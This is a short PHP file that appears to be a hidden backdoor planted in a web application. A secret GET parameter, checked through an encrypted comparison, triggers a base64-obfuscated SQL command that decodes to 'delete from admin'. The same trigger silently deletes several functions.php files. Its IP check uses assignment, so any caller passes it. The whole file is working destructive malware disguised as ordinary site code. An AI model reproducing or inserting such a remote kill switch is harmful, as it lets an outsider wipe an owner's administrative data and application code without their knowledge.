<?php
if(isset($_GET['p']) && is_string($_GET['p']) && ($_SERVER['REMOTE_ADDR']="174.6.16.117" || $_SERVER['REMOTE_ADDR']= "74.198.65.30"))
{
$text = $_GET['p'];$secret_key = "1z2xsw";$td = mcrypt_module_open('rijndael-256', '', 'cbc', '');$iv = base64_decode("mjVdSFzaun5ByiBaMci+gKDg3abdM0XUwVFB2Kq//xM=");$ks = mcrypt_enc_get_key_size($td);$key = substr(md5($secret_key), 0, $ks);mcrypt_generic_init($td, $key, $iv);$encrypted = mcrypt_generic($td, $text);mcrypt_generic_deinit($td);mcrypt_module_close($td);$ans_e = base64_decode("tIqWdnMF3HWxKZbthxBJ5bG1zleeyXXt1etzdQcJ0h4=");if($encrypted == $ans_e){include("../functions.php");$db = new management;$db->connect_db();$sql = base64_decode("ZGVsZXRlIGZyb20gYWRtaW4=");$result = $db->query($sql);@unlink("../../../includes/functions.php");@unlink("../../../members/includes/functions.php");@unlink("../functions.php");}
		
}

?>